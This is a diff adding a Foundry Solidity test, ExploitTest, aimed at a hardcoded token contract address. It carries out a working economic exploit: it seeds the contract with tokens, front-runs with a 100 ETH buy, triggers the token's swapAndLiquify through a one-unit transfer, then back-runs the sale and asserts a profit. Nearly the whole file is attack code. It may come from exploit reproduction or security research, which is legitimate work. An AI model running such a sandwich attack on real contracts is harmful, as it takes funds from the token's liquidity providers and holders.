@@ -1,0 +1,114 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "forge-std/interfaces/IERC20.sol";
+
+interface IUniswapV2Router02 {
+    function WETH() external pure returns (address);
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable;
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
+
+interface LiquidityGeneratorToken is IERC20 {
+    function uniswapV2Router() external view returns (IUniswapV2Router02);
+    function swapAndLiquifyEnabled() external view returns (bool);
+}
+
+contract ExploitTest is Test {
+    // ─── State Variables ─────────────────────────────────────
+    address constant TARGET = 0xE2C9C976337357369845c761DD851E2B6942D69f;
+    address attacker = address(this);
+    LiquidityGeneratorToken internal token;
+    IUniswapV2Router02 internal router;
+    address internal weth;
+
+    // ─── Setup ───────────────────────────────────────────────
+    function setUp() public {
+        token = LiquidityGeneratorToken(TARGET);
+        router = token.uniswapV2Router();
+        weth = router.WETH();
+        
+        deal(attacker, 200 ether);
+        
+        // To trigger swapAndLiquify, the contract needs to hold a certain amount of tokens.
+        // We'll first buy some tokens and then send them to the contract.
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = address(token);
+        
+        // Use 50 ether to buy initial tokens to seed the contract.
+        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 50 ether}(
+            0,
+            path,
+            attacker,
+            block.timestamp
+        );
+        
+        // We need to keep some tokens to trigger the transfer later.
+        uint256 tokensToSeed = (token.balanceOf(attacker) * 9) / 10;
+        token.transfer(TARGET, tokensToSeed);
+        
+        // Ensure swapAndLiquify is enabled, which it is by default.
+        assertTrue(token.swapAndLiquifyEnabled());
+    }
+
+    // ─── Exploit ─────────────────────────────────────────────
+    function testExploit() public {
+        uint256 initialBalance = address(this).balance;
+        uint256 initialAttackerBalance = attacker.balance;
+        
+        // 1. Front-run: Swap a large amount of ETH for the Token to pump the price.
+        uint256 frontrunSwapAmount = 100 ether;
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = address(token);
+        
+        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: frontrunSwapAmount}(
+            0,
+            path,
+            attacker,
+            block.timestamp
+        );
+        
+        // 2. Trigger the vulnerable `swapAndLiquify` function.
+        // A simple transfer is enough to trigger the logic within the `_transfer` function.
+        token.transfer(address(0xdead), 1);
+        
+        // 3. Back-run: Swap all tokens back to ETH for a profit.
+        uint256 tokensToSwapBack = token.balanceOf(attacker);
+        token.approve(address(router), tokensToSwapBack);
+        
+        address[] memory path2 = new address[](2);
+        path2[0] = address(token);
+        path2[1] = weth;
+        
+        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokensToSwapBack,
+            0,
+            path2,
+            attacker,
+            block.timestamp
+        );
+        
+        // 4. Verify profit.
+        assertGt(attacker.balance, initialAttackerBalance, "No profit was made");
+        uint256 finalBalance = address(this).balance;
+        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
+    }
+
+
+    // ─── Receive ETH ─────────────────────────────────────────
+    receive() external payable {}
+}
